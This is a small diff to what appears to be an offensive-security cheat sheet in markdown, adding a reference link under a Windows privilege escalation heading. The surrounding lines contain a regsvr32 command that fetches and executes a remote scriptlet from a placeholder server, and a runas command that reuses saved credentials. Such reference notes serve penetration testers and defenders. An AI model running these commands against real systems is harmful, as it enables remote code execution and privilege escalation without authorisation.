@@ -490,4 +490,5 @@ RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`\
 # Privesc
 
 ## Windows
+https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md#discovery
 Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
